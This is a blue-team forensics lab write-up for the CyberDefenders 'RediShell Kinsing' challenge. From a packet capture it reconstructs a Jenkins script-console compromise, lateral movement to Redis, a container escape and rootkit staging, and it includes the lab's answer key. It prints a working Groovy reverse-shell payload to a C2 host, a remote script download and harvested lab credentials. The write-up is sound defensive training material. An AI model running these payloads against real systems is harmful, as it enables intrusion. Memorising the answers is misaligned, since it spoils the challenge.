---
layout: lab
title: RediShell Kinsing
platform: CyberDefenders
difficulty: Easy
category: Network Forensics
skill: Network Forensics
tools: Wireshark
tactics: "[Initial Access, Execution, Privilege Escalation, Credential Access]"
proof: https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/redishell-kinsing/
challenge_url: https://cyberdefenders.org/blueteam-ctf-challenges/redishell-kinsing/
permalink: /blue-team/labs/redishell/
summary: '"The packet capture was killed mid-attack. Race against incomplete evidence to reconstruct how attackers breached Jenkins, pivoted through containers, and escaped to the host"'
art: https://cyberdefenders.org/media/terraform/RediShell%20-%20Kinsing/RediShell_-_Kinsing.webp
---
## Scenario

Security monitoring detected unusual outbound connections from Wowza's container subnet to a suspicious external IP. A packet capture was initiated automatically but terminated when the attacker discovered and killed the monitoring process. The task is to analyze the captured traffic to understand how the attacker gained initial access and moved laterally through the containerized environment.

---

## Analysis Tools

- Wireshark
- Filter: `http`, `http && ip.addr == 185.220.101.50`, `ip.addr == 185.220.101.50 and tcp.port == 4444`
- Follow TCP Stream for session reconstruction

---

## Initial Access — Jenkins Exploitation

Filtering for HTTP traffic immediately revealed `172.16.10.10` communicating with the external IP `185.220.101.50`. Following the HTTP stream identified the target as a **Jenkins 2.387.1** server — the first compromised system.

**First compromised system:** `172.16.10.10` **Attacker C2:** `185.220.101.50`

### Proof of Concept

Before deploying a full reverse shell, the attacker tested code execution via Jenkins' script console by reading a sensitive file:

```
Form item: "script" = "println 'cat /etc/passwd'.execute().text"
```

**Vulnerable endpoint:** `/script` **PoC file read:** `/etc/passwd`

### Reverse Shell

With code execution confirmed, the attacker established a reverse shell back to their C2:


```groovy
Form item: "script" = "def cmd = ["bash", "-c", "bash -i >& /dev/tcp/185.220.101.50/4444 0>&1"]; cmd.execute()"
```

**Reverse shell port:** `4444`

---

## Post-Exploitation — Jenkins Container

Filtering for
```bash
ip.addr == 185.220.101.50 and tcp.port == 4444
```
and following the TCP stream reconstructed the attacker's interactive shell session.
### Enumeration

The attacker downloaded and executed the well-known Linux privilege escalation enumeration script:

```zsh
wget http://185.220.101.50:2345/linpeas.sh
```
![[redishell_linpeas.png]]
**Enumeration script:** `linpeas.sh`

### Credential Harvesting

After running linpeas, the attacker browsed the Jenkins home directory and located a plaintext credentials file:

````zsh
cat /var/jenkins_home/credentials.txt
```

**File read:** `/var/jenkins_home/credentials.txt`

The file contained hardcoded lateral movement credentials:
```
TELNET_USER=redis_user
TELNET_PASS=R3d1s_Us3r_P@ss!
TELNET_HOST=172.16.10.20
TELNET_PORT=23
````

**Credentials:** `redis_user:R3d1s_Us3r_P@ss!`

---

## Lateral Movement — Redis Container

Using the harvested credentials, the attacker connected to the second container via **Telnet** — an unencrypted legacy protocol transmitting all data in cleartext, making it fully visible in the packet capture.

**Protocol:** Telnet **Second compromised system:** `172.16.10.20`

The Telnet login banner revealed the hostname and service version of the second container:

**Hostname and service:** `redis-db.corp.local` running a vulnerable version of Redis `5.0.7

---

## Privilege Escalation — Redis Container

### Exploit Upload

The attacker uploaded a custom Lua exploit script targeting a vulnerability in the Redis scripting subsystem:

**Uploaded file:** `exploit.lua`

### SUID Binary Exploitation

The exploit targeted the SUID binary:

**SUID binary:** `/usr/local/bin/redis-backup`

With the exploit executed, the attacker achieved root access inside the Redis container. The first command executed after privilege escalation was observed in the stream. `whoami

**CVE:** `CVE-2025-49844` — Redis Lua subsystem privilege escalation
![[redishell_privesc.png]]

---
## Container Escape

With root inside the container, the attacker executed a container escape script leveraging a cgroups misconfiguration:

**Escape script:** observed in stream, establishing a new reverse shell to C2 `escape.sh`

**Escape shell port:** `5555` **CVE:** `CVE-2022-0492` — Linux kernel cgroups container escape

The attacker confirmed host access by creating a proof-of-compromise file:

**Proof file:** `/tmp/you_have_been_hacked.txt`
![[redishell_escape.png]]

---

## Persistence

### Upload Server

To facilitate further tool uploads to the compromised host, the attacker installed a Python-based file upload server via pip:

**Server installed:** `uploadserver 5.2.2`

bash

````zsh
pip install uploadserver==5.2.2
```

### Kernel Rootkit

Using the upload server, the attacker transferred the following files for kernel-level rootkit installation, providing persistent and stealthy long-term access:
```
kernel-rootkit.c
Makefile
install-rootkit.sh
````

These files were also observed earlier in the HTTP logs during the initial Jenkins exploitation phase, indicating the attacker had pre-staged them on their C2.

---

## Anti-Forensics — Killing the Packet Capture

Before concluding their session, the attacker discovered the active packet capture process and terminated it:

bash

````bash
kill -9 24918
```

The stream showed the attacker enumerating running processes, identifying the tcpdump PID, and killing it — explaining why the capture ended abruptly.

---

## Attack Chain
```
Attacker (185.220.101.50)
        ↓
Jenkins 2.387.1 /script endpoint — RCE via Groovy script console
        ↓
Reverse shell → port 4444
        ↓
linpeas.sh enumeration
        ↓
cat /var/jenkins_home/credentials.txt → redis_user:R3d1s_Us3r_P@ss!
        ↓
Telnet → 172.16.10.20:23 (redis-db.corp.local)
        ↓
exploit.lua → CVE-2025-49844 → /usr/local/bin/redis-backup SUID → root
        ↓
Container escape → CVE-2022-0492 → reverse shell port 5555
        ↓
Host root → /tmp/you_have_been_hacked.txt
        ↓
pip install uploadserver → kernel-rootkit upload
        ↓
kill -9 24918 (tcpdump terminated)
````

---

## IOCs 

| Type                         | Value                                                |
| ---------------------------- | ---------------------------------------------------- |
| Attacker C2                  | `185[.]220[.]101[.]50`                               |
| First compromised host       | `172[.]16[.]10[.]10`                                 |
| Second compromised host      | `172[.]16[.]10[.]20`                                 |
| Reverse shell port (initial) | `4444`                                               |
| Reverse shell port (escape)  | `5555`                                               |
| Credentials harvested        | `redis_user:R3d1s_Us3r_P@ss!`                        |
| Proof file                   | `/tmp/you_have_been_hacked.txt`                      |
| Rootkit files                | `kernel-rootkit.c`, `Makefile`, `install-rootkit.sh` |

---
## MITRE ATT&CK

| Technique                                              | ID        |
| ------------------------------------------------------ | --------- |
| Exploit Public-Facing Application (Jenkins)            | T1190     |
| Command and Scripting Interpreter                      | T1059     |
| Ingress Tool Transfer (linpeas, exploit.lua)           | T1105     |
| Credentials in Files                                   | T1552.001 |
| Remote Services: Telnet                                | T1021     |
| Exploitation for Privilege Escalation (CVE-2025-49844) | T1068     |
| Escape to Host (CVE-2022-0492)                         | T1611     |
| Rootkit                                                | T1014     |
| Indicator Removal: Clear Network Traffic Capture       | T1070     |

---

{% include flag.html question="Security monitoring flagged suspicious HTTP traffic targeting the container subnet. Identifying the first system that received malicious requests is essential for establishing the initial point of compromise. What is the IP address of the first compromised system?" answer="172.16.10.10" %}

{% include answer.html question="Identifying attacker IP is critical for threat intelligence and blocking future connections. What is the attacker's command and control (C2) IP address?" answer="185.220.101.50" %}

{% include flag.html question="What web application and version was exploited for initial access?" answer="Jenkins, 2.387.1" %}

{% include answer.html question="Before fully exploiting a vulnerability, attackers often perform a proof-of-concept test to confirm code execution capabilities. What file did the attacker initially read to test the vulnerability? Provide full path" answer="/etc/passwd" %}

{% include flag.html question="Identifying this vulnerable endpoint helps understand the attack vector and informs remediation efforts. What is the URI path of the vulnerable endpoint exploited by the attacker?" answer="/script" %}

{% include answer.html question="After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?" answer="4444" %}

{% include flag.html question="Once inside the compromised container, the attacker uploaded a well-known enumeration script to identify privilege escalation vectors. What privilege escalation enumeration script did the attacker download after gaining shell access?" answer="LinPEAS" %}

{% include answer.html question="What file did the attacker read to obtain lateral movement credentials? Provide full path" answer="/var/jenkins_home/credentials.txt" %}

{% include flag.html question="What username and password combination did the attacker use for authentication to the second system?" answer="redis_user:R3d1s_Us3r_P@ss!" %}

{% include answer.html question="The attacker used a legacy protocol to connect to the second target system. What unencrypted protocol did the attacker use for lateral movement?" answer="telnet" %}

{% include answer.html question="After successfully authenticating with harvested credentials, the attacker gained access to a second container in the environment. Identifying this system helps map the scope of the compromise. What is the IP address of the second compromised system?" answer="172.16.10.20" %}

{% include flag.html question="The Telnet login banner and subsequent enumeration revealed the hostname and the version of the data storage service running on the second compromised container. This information is crucial for identifying potential vulnerabilities. What is the hostname of the second compromised container and the version of the vulnerable data storage service?" answer="redis-db.corp.local, 5.0.7" %}

{% include answer.html question="After gaining user-level access to the second container, the attacker uploaded a custom exploit file targeting a vulnerability in the container's data storage service. What file did the attacker upload for privilege escalation on the second system?" answer="exploit.lua" %}

{% include flag.html question="What is the full path of the SUID binary exploited for privilege escalation?" answer="/usr/local/bin/redis-backup" %}

{% include answer.html question="What was the first command the attacker executed after privilege escalation?" answer="whoami" %}

{% include flag.html question="The Lua exploit file uploaded by the attacker targets a specific vulnerability in the Redis scripting subsystem. What CVE number is associated with the Redis Lua subsystem vulnerability used for privilege escalation?" answer="CVE-2025-49844" %}

{% include answer.html question="With root access inside the container, the attacker's next objective was escaping to the underlying host system. What is the name of the script executed to escape from the container to the host system?" answer="escape.sh" %}

{% include flag.html question="The container escape script established a new reverse shell connection to the attacker's C2 infrastructure. What port was used for the reverse shell connection after escaping the container?" answer="5555" %}

{% include answer.html question="What CVE number is associated with the container escape vulnerability?" answer="CVE-2022-0492" %}

{% include flag.html question="After successfully escaping to the host system, the attacker created a file to document their access. What is the full path of the proof-of-compromise file created by the attacker on the host system?" answer="/tmp/you_have_been_hacked.txt" %}

{% include answer.html question="To facilitate uploading additional tools to the compromised host, the attacker installed a Python-based HTTP server that supports file uploads. What server did the attacker install on the host system?" answer="uploadserver" %}

{% include flag.html question="Using the upload server, the attacker transferred files necessary for installing a kernel-level rootkit, which would provide persistent, stealthy access to the compromised host. What files did the attacker upload to the host system for rootkit installation?" answer="kernel-rootkit.c, Makefile, install-rootkit.sh" %}

{% include answer.html question="Before concluding their session, the attacker discovered that network traffic was being captured and took action to terminate the monitoring process. What is the full command executed by the attacker to terminate the network packet capture process?" answer="kill -9 24918" %}


I successfully completed RediShell - Kinsing Blue Team Lab at @CyberDefenders!
https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/redishell-kinsing/
 
#CyberDefenders #CyberSecurity #BlueYard #BlueTeam #InfoSec #SOC #SOCAnalyst #DFIR #CCD #CyberDefender